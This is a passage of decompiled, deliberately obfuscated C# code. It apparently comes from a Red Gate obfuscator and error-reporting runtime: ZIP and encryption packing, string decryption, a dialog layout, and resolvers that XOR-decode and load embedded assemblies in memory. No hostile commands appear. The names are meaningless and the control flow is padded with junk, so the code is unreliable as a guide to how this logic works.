					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_2.Length;
				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_2[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class25.smethod_26(stream, 67324752);
				Class25.smethod_155(stream, 20);
				Class25.smethod_155(stream, 0);
				Class25.smethod_155(stream, 8);
				Class25.smethod_26(stream, (int)num3);
				Class25.smethod_26(stream, (int)num5);
				long position3 = stream.Position;
				Class25.smethod_26(stream, 0);
				Class25.smethod_26(stream, byte_2.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class25.smethod_155(stream, bytes.Length);
				Class25.smethod_155(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class25.smethod_119(byte_2, class20_2);
				while (!Class25.smethod_185(class20_2))
				{
					byte[] array9 = new byte[512];
					int num8 = Class25.smethod_99(array9, class20_2);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class25.smethod_52(class20_2);
				while (!Class25.smethod_184(class20_2))
				{
					byte[] array10 = new byte[512];
					int num9 = Class25.smethod_99(array10, class20_2);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long num10 = Class25.smethod_188(class20_2);
				Class25.smethod_26(stream, 33639248);
				Class25.smethod_155(stream, 20);
				Class25.smethod_155(stream, 20);
				Class25.smethod_155(stream, 0);
				Class25.smethod_155(stream, 8);
				Class25.smethod_26(stream, (int)num3);
				Class25.smethod_26(stream, (int)num5);
				Class25.smethod_26(stream, (int)num10);
				Class25.smethod_26(stream, byte_2.Length);
				Class25.smethod_155(stream, bytes.Length);
				Class25.smethod_155(stream, 0);
				Class25.smethod_155(stream, 0);
				Class25.smethod_155(stream, 0);
				Class25.smethod_155(stream, 0);
				Class25.smethod_26(stream, 0);
				Class25.smethod_26(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class25.smethod_26(stream, 101010256);
				Class25.smethod_155(stream, 0);
				Class25.smethod_155(stream, 0);
				Class25.smethod_155(stream, 1);
				Class25.smethod_155(stream, 1);
				Class25.smethod_26(stream, 46 + bytes.Length);
				Class25.smethod_26(stream, (int)(30 + bytes.Length + num10));
				Class25.smethod_155(stream, 0);
				stream.Seek(position3, SeekOrigin.Begin);
				Class25.smethod_26(stream, (int)num10);
				break;
			}
			case 1:
			{
				Class25.smethod_26(stream, 25000571);
				Class25.smethod_26(stream, byte_2.Length);
				byte[] array5;
				for (int i = 0; i < byte_2.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_2.Length - i)];
					Buffer.BlockCopy(byte_2, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class25.smethod_26(stream, 0);
					Class25.smethod_26(stream, array5.Length);
					Class14.Class20 class20_ = new Class14.Class20();
					Class25.smethod_119(array5, class20_);
					while (!Class25.smethod_185(class20_))
					{
						byte[] array6 = new byte[512];
						int num = Class25.smethod_99(array6, class20_);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class25.smethod_52(class20_);
					while (!Class25.smethod_184(class20_))
					{
						byte[] array7 = new byte[512];
						int num2 = Class25.smethod_99(array7, class20_);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
					long position2 = stream.Position;
					stream.Position = position;
					Class25.smethod_26(stream, (int)Class25.smethod_188(class20_));
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class25.smethod_26(stream, 41777787);
				byte[] array3 = Class25.smethod_226(1, (byte[])null, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform2 = Class25.smethod_140(byte_1, bool_0: false, byte_0))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class25.smethod_26(stream, 58555003);
				byte[] array = Class25.smethod_226(1, (byte[])null, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform = Class25.smethod_215(bool_0: false, byte_1, byte_0))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class14.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static string smethod_227(Class28.Class32 class32_0)
	{
		return class32_0.string_2;
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class40.Struct11 struct11_0, int int_1);

	static void smethod_228(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
	{
		while (true)
		{
			switch (int_3 ^ int_2)
			{
			case 41:
				stream_0.Write(byte_0, int_0, int_1);
				return;
			}
		}
	}

	static Evidence smethod_229(Assembly assembly_0, int int_0, int int_1)
	{
		int num = 10;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 30:
				num = 0;
				num2 = 2;
				break;
			default:
				num = 1;
				num2 = 5;
				break;
			}
			int num3 = num2;
			num = 4;
			switch (num3)
			{
			default:
				num = 3;
				goto IL_003b;
			case 3:
				num = 2;
				goto IL_0043;
			case 4:
				num = 3;
				goto IL_003b;
			case 5:
				num = 2;
				goto IL_0043;
			case 6:
				num = 6;
				num3 = 0;
				num = 4;
				goto case 0;
			case 0:
				num = 10;
				continue;
			case 7:
				num = 10;
				continue;
			case 1:
				num = 12;
				break;
			case 2:
				{
					num = 12;
					break;
				}
				IL_0043:
				num3 = 0;
				num = 4;
				goto case 0;
				IL_003b:
				num3 = 0;
				num = 4;
				goto case 0;
			}
			break;
		}
		return Class25.smethod_57(assembly_0, 739, 733);
	}

	static void smethod_230(Form1 form1_0)
	{
		((Control)form1_0).SuspendLayout();
		((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_1).set_Size(new Size(100, 24));
		((Control)form1_0.button_1).set_Location(new Point(408 - ((Control)form1_0.button_1).get_Width(), 188));
		((Control)form1_0.button_1).set_TabIndex(0);
		((Control)form1_0.button_1).set_Text("&Quit");
		((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
		((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_0).set_Size(new Size(100, 24));
		((Control)form1_0.button_0).set_Location(new Point(((Control)form1_0.button_1).get_Left() - ((Control)form1_0.button_0).get_Width() - 6, 188));
		((Control)form1_0.button_0).set_TabIndex(1);
		((Control)form1_0.button_0).set_Text("&Continue");
		((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
		((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form1_0.control2_0).SetBounds(6, 186, 120, 32);
		Class25.smethod_42(form1_0.control1_0, Enum1.const_2);
		((Control)form1_0.class36_0).set_Anchor((AnchorStyles)13);
		((Control)form1_0.class36_0).set_Location(new Point(20, 72));
		((Control)form1_0.class36_0).set_Size(new Size(382, 13));
		((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form1_0).set_ClientSize(new Size(418, 224));
		((Form)form1_0).set_ControlBox(false);
		((Control)form1_0).get_Controls().AddRange((Control[])(object)new Control[5]
		{
			form1_0.control2_0,
			(Control)form1_0.button_0,
			(Control)form1_0.button_1,
			form1_0.control1_0,
			(Control)form1_0.class36_0
		});
		((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form1_0).set_MaximizeBox(false);
		((Form)form1_0).set_MinimizeBox(false);
		((Form)form1_0).set_ShowInTaskbar(false);
		((Form)form1_0).set_StartPosition((FormStartPosition)1);
		((Control)form1_0).ResumeLayout(false);
	}

	static string smethod_231()
	{
		return "Software\\Red Gate\\" + Class25.smethod_37();
	}

	static void smethod_232(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class25.smethod_54(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static long smethod_233(Stream stream_0, int int_0, int int_1)
	{
		int num = 9;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 65:
				num = 1;
				num2 = 7;
				break;
			default:
				num = 2;
				num2 = 4;
				break;
			}
			int num3 = num2;
			num = 0;
			switch (num3)
			{
			default:
				num = 10;
				goto IL_0047;
			case 1:
				num = 9;
				continue;
			case 2:
				num = 12;
				num3 = 5;
				num = 0;
				goto case 5;
			case 3:
				num = 10;
				goto IL_0047;
			case 4:
				num = 8;
				num3 = 5;
				num = 0;
				goto case 5;
			case 5:
				num = 9;
				continue;
			case 0:
				num = 6;
				break;
			case 6:
				num = 6;
				break;
			case 7:
				{
					num = 6;
					break;
				}
				IL_0047:
				num3 = 5;
				num = 0;
				goto case 5;
			}
			break;
		}
		return Class25.smethod_213(stream_0, 944, 918);
	}

	static void smethod_234(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	static bool smethod_235(Class14.Class15 class15_0)
	{
		switch (class15_0.int_4)
		{
		case 2:
		{
			if (class15_0.bool_0)
			{
				class15_0.int_4 = 12;
				return false;
			}
			int num = Class25.smethod_147(class15_0.class16_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class25.smethod_123(class15_0.class16_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class15_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class25.smethod_144(class15_0.class16_0);
				class15_0.int_4 = 3;
				break;
			case 1:
				class15_0.class18_0 = Class14.Class18.class18_0;
				class15_0.class18_1 = Class14.Class18.class18_1;
				class15_0.int_4 = 7;
				break;
			case 2:
				class15_0.class19_0 = new Class14.Class19();
				class15_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class15_0.int_8 = Class25.smethod_147(class15_0.class16_0, 16)) < 0)
			{
				return false;
			}
			Class25.smethod_123(class15_0.class16_0, 16);
			class15_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class25.smethod_147(class15_0.class16_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class25.smethod_123(class15_0.class16_0, 16);
			class15_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class25.smethod_7(class15_0.class17_0, class15_0.class16_0, class15_0.int_8);
			class15_0.int_8 -= num3;
			if (class15_0.int_8 == 0)
			{
				class15_0.int_4 = 2;
				return true;
			}
			return !Class25.smethod_48(class15_0.class16_0);
		}
		case 6:
			if (!Class25.smethod_56(class15_0.class19_0, class15_0.class16_0))
			{
				return false;
			}
			class15_0.class18_0 = Class25.smethod_64(class15_0.class19_0);
			class15_0.class18_1 = Class25.smethod_36(class15_0.class19_0);
			class15_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class25.smethod_116(class15_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static bool smethod_236(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_1;
	}

	static string smethod_237(int int_0, int int_1)
	{
		int num = 19;
		int num8 = default(int);
		int num6 = default(int);
		char[] array = default(char[]);
		char[] char_2 = default(char[]);
		int num7 = default(int);
		while (true)
		{
			int num2 = int_0 ^ 0x465A379D ^ int_1;
			char[] char_ = Class4.char_1;
			int num3 = char_[num2];
			num = 9;
			int num4 = 11;
			num = 18;
			while (true)
			{
				num = 24;
				int num5;
				string result;
				if ((result = Class4.string_0[num3]) == null)
				{
					num = 10;
					num5 = 8;
				}
				else
				{
					num = 16;
					num5 = 5;
				}
				num4 = num5;
				num = 18;
				while (true)
				{
					switch (num4)
					{
					case 10:
						num = 5;
						goto IL_001c;
					case 9:
						num = 23;
						num8 = 1 + num8;
						num4 = 1;
						num = 18;
						goto case 1;
					case 1:
					{
						num = 15;
						int num9;
						if (num8 >= num6)
						{
							num = 1;
							num9 = 7;
						}
						else
						{
							num = 7;
							num9 = 0;
						}
						num4 = num9;
						num = 18;
						continue;
					}
					case 8:
						num = 6;
						num6 = char_[num2 + 1];
						num = 22;
						goto IL_0079;
					case 2:
						num = 0;
						array = new char[num6];
						char_2 = Class4.char_0;
						num7 = char_2.Length;
						num2 += 3;
						num = 21;
						num4 = 3;
						num = 18;
						goto case 3;
					case 3:
						num = 3;
						num8 = 0;
						num4 = 1;
						num = 18;
						goto case 1;
					case 6:
						num = 22;
						goto IL_0079;
					case 0:
						num = 5;
						goto IL_001c;
					case 11:
						break;
					default:
						num = 13;
						goto IL_0143;
					case 4:
						num = 19;
						goto end_IL_011e;
					case 12:
						num = 13;
						goto IL_0143;
					case 13:
						num = 19;
						goto end_IL_011e;
					case 5:
						num = 11;
						return result;
					case 7:
						{
							num = 2;
							result = new string(array);
							Class4.string_0[num3] = result;
							return result;
						}
						IL_0143:
						num4 = 13;
						num = 18;
						goto case 13;
						IL_0079:
						num6 = (int)((uint)char_[num2 + 2] << 16) + num6;
						num = 17;
						num4 = 2;
						num = 18;
						goto case 2;
						IL_001c:
						array[num8] = (char)(char_[num2 + num8] ^ char_2[(num8 + num3) % num7]);
						num = 8;
						num4 = 9;
						num = 18;
						goto case 9;
					}
					break;
				}
				continue;
				end_IL_011e:
				break;
			}
		}
	}

	static Evidence smethod_238(int int_0, int int_1, Assembly assembly_0)
	{
		while (true)
		{
			switch (int_0 ^ int_1)
			{
			case 91:
				return assembly_0.get_Evidence();
			}
		}
	}

	static int smethod_239(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 109:
				return Environment.TickCount;
			}
			int num = 5;
		}
	}

	static void smethod_240(bool bool_0, EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_3 = bool_0;
	}

	[DllImport("gdi32.dll")]
	static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_241(string string_0, string string_1, int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 19:
				File.Copy(string_0, string_1);
				return;
			}
			num = 0;
		}
	}

	static int smethod_242(Class14.Class24 class24_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class24_0.int_2 >= 8)
		{
			class24_0.byte_0[class24_0.int_1++] = (byte)class24_0.uint_0;
			class24_0.uint_0 >>= 8;
			class24_0.int_2 -= 8;
		}
		if (int_1 > class24_0.int_1 - class24_0.int_0)
		{
			int_1 = class24_0.int_1 - class24_0.int_0;
			Array.Copy(class24_0.byte_0, class24_0.int_0, byte_0, int_0, int_1);
			class24_0.int_0 = 0;
			class24_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class24_0.byte_0, class24_0.int_0, byte_0, int_0, int_1);
			class24_0.int_0 += int_1;
		}
		return int_1;
	}

	[DllImport("user32.dll")]
	static extern int GetSystemMetrics(int int_0);

	static bool smethod_243(Class14.Class23 class23_0)
	{
		return class23_0.int_8 == class23_0.int_7;
	}

	static int smethod_244(Stream stream_0, int int_0, int int_1)
	{
		int num = 12;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 107:
				num = 10;
				num2 = 5;
				break;
			default:
				num = 9;
				num2 = 3;
				break;
			}
			int num3 = num2;
			num = 5;
			switch (num3)
			{
			default:
				num = 3;
				goto IL_0050;
			case 0:
				num = 4;
				goto IL_0048;
			case 1:
				num = 1;
				goto IL_0040;
			case 3:
				num = 1;
				goto IL_0040;
			case 4:
				num = 4;
				goto IL_0048;
			case 6:
				num = 3;
				goto IL_0050;
			case 2:
				goto IL_0054;
			case 5:
				num = 11;
				break;
			case 7:
				{
					num = 11;
					break;
				}
				IL_0040:
				num3 = 2;
				num = 5;
				goto IL_0054;
				IL_0048:
				num3 = 2;
				num = 5;
				goto IL_0054;
				IL_0050:
				num3 = 2;
				num = 5;
				goto IL_0054;
			}
			break;
			IL_0054:
			num = 12;
		}
		return Class25.smethod_39(stream_0, 651, 666);
	}

	static Assembly smethod_245(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		int num = 33;
		Assembly assembly_ = default(Assembly);
		byte[] array = default(byte[]);
		int num5 = default(int);
		int num4 = default(int);
		MemoryStream memoryStream = default(MemoryStream);
		int num15 = default(int);
		string[] array3 = default(string[]);
		while (true)
		{
			string text = Class25.smethod_237(1180317447, 6);
			num = 29;
			while (true)
			{
				string text2 = text;
				string string_ = Class25.smethod_93((object)text2, (object)'1', 24, 58);
				int num2 = 4;
				num = 23;
				while (true)
				{
					num = 1;
					AppDomain appDomain_ = Class25.smethod_224(620, 513);
					Dictionary<string, string> dictionary = (Dictionary<string, string>)Class25.smethod_13(appDomain_, string_, 835, 891);
					num = 16;
					num2 = 9;
					num = 23;
					while (true)
					{
						num = 2;
						if (dictionary == null)
						{
							num = 27;
							num2 = 0;
							num = 23;
							while (true)
							{
								num = 20;
								dictionary = new Dictionary<string, string>();
								Class25.smethod_34(appDomain_, string_, (object)dictionary, 639, 570);
								while (true)
								{
									num2 = 1;
									num = 23;
									while (true)
									{
										num = 19;
										assembly_ = Class25.smethod_60(945, 960);
										Stream stream = Class25.smethod_18(assembly_, text, 916, 1023);
										num = 24;
										num2 = 7;
										num = 23;
										while (true)
										{
											num = 6;
											int num3;
											if (stream != null)
											{
												num = 7;
												num3 = 16;
											}
											else
											{
												num = 18;
												num3 = 17;
											}
											num2 = num3;
											num = 23;
											while (true)
											{
												switch (num2)
												{
												case 16:
													num = 21;
													array = new byte[Class25.smethod_233(stream, 383, 318) - 1L];
													num = 12;
													num2 = 5;
													num = 23;
													goto case 5;
												case 5:
													num = 26;
													num5 = Class25.smethod_244(stream, 158, 245);
													num = 17;
													goto IL_0076;
												case 15:
													num = 8;
													num4 = 0;
													num2 = 11;
													num = 23;
													goto case 11;
												case 11:
												{
													num = 3;
													int num6;
													if (num4 >= array.Length)
													{
														num = 15;
														num6 = 3;
													}
													else
													{
														num = 22;
														num6 = 6;
													}
													num2 = num6;
													num = 23;
													continue;
												}
												case 13:
													num = 13;
													num4++;
													num2 = 11;
													num = 23;
													goto case 11;
												case 8:
													num = 17;
													goto IL_0076;
												case 6:
													num = 14;
													array[num4] ^= (byte)((num4 + num5) & 0xFF);
													num = 30;
													num2 = 13;
													num = 23;
													goto case 13;
												case 7:
													break;
												case 1:
													goto end_IL_0175;
												case 14:
													goto end_IL_0181;
												case 0:
													goto end_IL_01bb;
												case 9:
													goto end_IL_01c4;
												case 4:
													goto end_IL_01e4;
												case 10:
													goto end_IL_01f3;
												default:
													num = 5;
													goto IL_0255;
												case 2:
													num = 5;
													goto IL_0255;
												case 12:
													num = 33;
													goto end_IL_0230;
												case 3:
													goto IL_0273;
												case 17:
													{
														num = 4;
														return null;
													}
													IL_0255:
													num2 = 12;
													num = 23;
													goto case 12;
													IL_0076:
													Class25.smethod_152(stream, array, 0, array.Length, 599, 531);
													num = 10;
													num2 = 15;
													num = 23;
													goto case 15;
												}
												break;
											}
											continue;
											end_IL_0175:
											break;
										}
										continue;
										end_IL_0181:
										break;
									}
									num = 25;
									continue;
									end_IL_01bb:
									break;
								}
								continue;
								end_IL_01c4:
								break;
							}
							continue;
						}
						goto IL_053b;
						IL_04ad:
						int num7 = 16;
						goto IL_0451;
						IL_04a5:
						num7 = 3;
						goto IL_03ec;
						IL_0273:
						num = 11;
						memoryStream = new MemoryStream();
						DeflateStream deflateStream = new DeflateStream(new MemoryStream(array), CompressionMode.Decompress, leaveOpen: true);
						try
						{
							int num8 = 7;
							int num9 = 7;
							num8 = 10;
							while (true)
							{
								num8 = 1;
								while (true)
								{
									byte[] array2 = new byte[1024];
									num9 = 1;
									num8 = 10;
									while (true)
									{
										num8 = 8;
										while (true)
										{
											int int_;
											int num10;
											if ((int_ = Class25.smethod_152((Stream)deflateStream, array2, 0, array2.Length, 121, 60)) > 0)
											{
												num8 = 9;
												num10 = 2;
											}
											else
											{
												num8 = 6;
												num10 = 4;
											}
											num9 = num10;
											num8 = 10;
											switch (num9)
											{
											case 0:
												num8 = 2;
												goto IL_02d9;
											case 2:
												num8 = 2;
												goto IL_02d9;
											case 3:
												num8 = 8;
												continue;
											case 1:
												break;
											default:
												goto end_IL_0316;
											case 5:
												goto IL_0320;
											case 6:
												goto IL_0325;
											case 7:
												goto end_IL_0328;
											case 4:
												{
													num8 = 5;
													goto end_IL_033d;
												}
												IL_02d9:
												Class25.smethod_143((Stream)memoryStream, array2, 0, int_, 398, 443);
												continue;
											}
											break;
										}
										continue;
										end_IL_0316:
										break;
									}
									num8 = 1;
									continue;
									IL_0320:
									num8 = 1;
									continue;
									IL_0325:
									num8 = 1;
									continue;
									end_IL_0328:
									break;
								}
								continue;
								end_IL_033d:
								break;
							}
						}
						finally
						{
							int num11 = 8;
							int num12 = 1;
							num11 = 3;
							while (true)
							{
								IL_03a2:
								num11 = 10;
								while (true)
								{
									int num13;
									if (deflateStream == null)
									{
										num11 = 1;
										num13 = 0;
									}
									else
									{
										num11 = 2;
										num13 = 5;
									}
									num12 = num13;
									num11 = 3;
									switch (num12)
									{
									default:
										num11 = 10;
										continue;
									case 3:
										num11 = 10;
										continue;
									case 4:
										num11 = 10;
										continue;
									case 6:
										num11 = 10;
										continue;
									case 1:
										break;
									case 0:
										num11 = 9;
										goto end_IL_039c;
									case 2:
										num11 = 9;
										goto end_IL_039c;
									case 5:
										num11 = 7;
										((IDisposable)deflateStream).Dispose();
										goto end_IL_039c;
									}
									goto IL_03a2;
									continue;
									end_IL_039c:
									break;
								}
								break;
							}
						}
						num7 = 13;
						int num14 = 4;
						num7 = 11;
						goto IL_04b3;
						IL_045b:
						num7 = 9;
						int num16;
						if (num15 >= array3.Length)
						{
							num7 = 21;
							num16 = 11;
						}
						else
						{
							num7 = 12;
							num16 = 10;
						}
						num14 = num16;
						num7 = 11;
						goto IL_04c3;
						IL_053b:
						Assembly assembly = (Assembly)Class25.smethod_175(appDomain_, text2, 371, 310);
						num14 = 8;
						num7 = 11;
						goto IL_0515;
						IL_0515:
						num7 = 10;
						int num17;
						if (!dictionary.ContainsKey(Class25.smethod_102(resolveEventArgs_0, 989, 958)))
						{
							num7 = 7;
							num17 = 1;
						}
						else
						{
							num7 = 0;
							num17 = 0;
						}
						num14 = num17;
						num7 = 11;
						goto IL_04c3;
						IL_042a:
						num7 = 4;
						Class25.smethod_254(appDomain_, text2, (object)assembly, 885, 884);
						array3 = Class25.smethod_58(assembly, 33, 80);
						num7 = 16;
						goto IL_0451;
						IL_0451:
						num15 = 0;
						num14 = 3;
						num7 = 11;
						goto IL_045b;
						IL_03ec:
						assembly = Class25.smethod_15(Class25.smethod_69(memoryStream, 971, 974), (byte[])null, Class25.smethod_229(assembly_, 136, 150), 770, 888);
						num7 = 8;
						num14 = 5;
						num7 = 11;
						goto IL_042a;
						IL_04c3:
						switch (num14)
						{
						case 12:
							break;
						case 5:
							goto IL_042a;
						case 3:
							goto IL_045b;
						case 10:
						{
							num7 = 2;
							string text3 = array3[num15];
							dictionary[text3] = text3;
							num15++;
							num7 = 20;
							num14 = 3;
							num7 = 11;
							goto IL_045b;
						}
						case 9:
							goto IL_04a5;
						case 6:
							goto IL_04ad;
						case 4:
							goto IL_04b3;
						default:
							goto IL_04bb;
						case 11:
							num7 = 6;
							num14 = 8;
							num7 = 11;
							goto IL_0515;
						case 8:
							goto IL_0515;
						case 7:
							goto IL_0537;
						case 0:
							num7 = 14;
							return assembly;
						case 1:
							num7 = 1;
							goto IL_056e;
						case 2:
							{
								num7 = 1;
								goto IL_056e;
							}
							IL_056e:
							return null;
						}
						num7 = 3;
						goto IL_03ec;
						IL_0537:
						num7 = 19;
						goto IL_053b;
						IL_04bb:
						num7 = 3;
						goto IL_03ec;
						IL_04b3:
						num7 = 3;
						goto IL_03ec;
						continue;
						end_IL_01e4:
						break;
					}
					continue;
					end_IL_01f3:
					break;
				}
				num = 29;
				continue;
				end_IL_0230:
				break;
			}
		}
	}

	static bool smethod_246(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_1;
	}

	static void smethod_247(bool bool_0, EventArgs2 eventArgs2_0)
	{
		eventArgs2_0.bool_0 = bool_0;
	}

	static void smethod_248(Exception exception_0, object object_0)
	{
		Class25.smethod_54(exception_0, new object[1] { object_0 });
	}

	static int smethod_249(Class14.Class16 class16_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class16_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class16_0.uint_0;
			class16_0.uint_0 >>= 8;
			class16_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class16_0.int_1 - class16_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class16_0.byte_0, class16_0.int_0, byte_0, int_0, int_1);
		class16_0.int_0 += int_1;
		if (((uint)(class16_0.int_0 - class16_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class16_0.uint_0 = class16_0.byte_0[class16_0.int_0++] & 0xFFu;
			class16_0.int_2 = 8;
		}
		return num + int_1;
	}

	static bool smethod_250(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_3;
	}

	static int smethod_251(Random random_0, int int_0, int int_1, int int_2, int int_3)
	{
		int num = 12;
		while (true)
		{
			int num2;
			switch (int_3 ^ int_2)
			{
			case 64:
				num = 9;
				num2 = 5;
				break;
			default:
				num = 2;
				num2 = 7;
				break;
			}
			int num3 = num2;
			num = 1;
			switch (num3)
			{
			default:
				num = 11;
				goto IL_0047;
			case 0:
				num = 11;
				goto IL_0047;
			case 2:
				num = 7;
				num3 = 1;
				num = 1;
				goto case 1;
			case 3:
				num = 11;
				goto IL_0047;
			case 6:
				num = 12;
				continue;
			case 7:
				num = 6;
				num3 = 1;
				num = 1;
				goto case 1;
			case 1:
				num = 12;
				continue;
			case 4:
				num = 3;
				break;
			case 5:
				{
					num = 3;
					break;
				}
				IL_0047:
				num3 = 1;
				num = 1;
				goto case 1;
			}
			break;
		}
		return Class25.smethod_203(random_0, int_0, int_1, 990, 1014);
	}

	static void smethod_252(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class25.smethod_54(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static string smethod_253(Environment.SpecialFolder specialFolder_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 19:
				return Environment.GetFolderPath(specialFolder_0);
			}
			int num = 3;
		}
	}

	static void smethod_254(AppDomain appDomain_0, string string_0, object object_0, int int_0, int int_1)
	{
		int num = 5;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 1:
				appDomain_0.SetData(string_0, object_0);
				return;
			}
			num = 5;
		}
	}

	static Assembly smethod_255(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		string text = Class25.smethod_169(1975749359, 4);
		string text2 = text;
		string string_ = Class25.smethod_132(45, (object)'1', 46, (object)text2);
		int num = 11;
		AppDomain appDomain = Class25.smethod_105(460, 387);
		Dictionary<string, string> dictionary = (Dictionary<string, string>)Class25.smethod_204(316, appDomain, 309, string_);
		num = 9;
		Assembly assembly;
		int num6;
		if (dictionary == null)
		{
			num = 12;
			dictionary = new Dictionary<string, string>();
			Class25.smethod_174(668, appDomain, 659, string_, (object)dictionary);
			num = 2;
			Assembly assembly_ = Class25.smethod_137(778, 891);
			Stream stream = Class25.smethod_103(text, 534, assembly_, 581);
			num = 15;
			if (stream == null)
			{
				num = 16;
				return null;
			}
			num = 4;
			byte[] array = new byte[Class25.smethod_124(stream, 373, 342) - 1L];
			num = 10;
			int num2 = Class25.smethod_94(stream, 332, 294);
			Class25.smethod_161(stream, array, 0, array.Length, 1006, 980);
			num = 0;
			int num3 = 0;
			num = 3;
			while (num3 < array.Length)
			{
				num = 13;
				array[num3] ^= (byte)((num3 + num2) & 0xFF);
				num = 7;
				num3++;
				num = 3;
			}
			num = 6;
			MemoryStream memoryStream = new MemoryStream();
			DeflateStream deflateStream = new DeflateStream(new MemoryStream(array), CompressionMode.Decompress, leaveOpen: true);
			try
			{
				int num4 = 4;
				byte[] array2 = new byte[1024];
				num4 = 5;
				int int_;
				while ((int_ = Class25.smethod_161((Stream)deflateStream, array2, 0, array2.Length, 297, 274)) > 0)
				{
					Class25.smethod_228((Stream)memoryStream, array2, 0, int_, 814, 775);
				}
			}
			finally
			{
				int num5 = 1;
				((IDisposable)deflateStream)?.Dispose();
			}
			num6 = 2;
			assembly = Class25.smethod_114(Class25.smethod_133(memoryStream, 726, 748), (byte[])null, Class25.smethod_238(844, 791, assembly_), 449, 420);
			num6 = 11;
			appDomain.SetData(text2, assembly);
			string[] manifestResourceNames = assembly.GetManifestResourceNames();
			int num7 = 0;
			num6 = 7;
			while (num7 < manifestResourceNames.Length)
			{
				num6 = 8;
				string text3 = manifestResourceNames[num7];
				dictionary[text3] = text3;
				num7++;
				num6 = 7;
			}
			num6 = 6;
			num6 = 1;
		}
		else
		{
			assembly = (Assembly)appDomain.GetData(text2);
			num6 = 1;
		}
		if (dictionary.ContainsKey(resolveEventArgs_0.Name))
		{
			num6 = 12;
			return assembly;
		}
		num6 = 10;
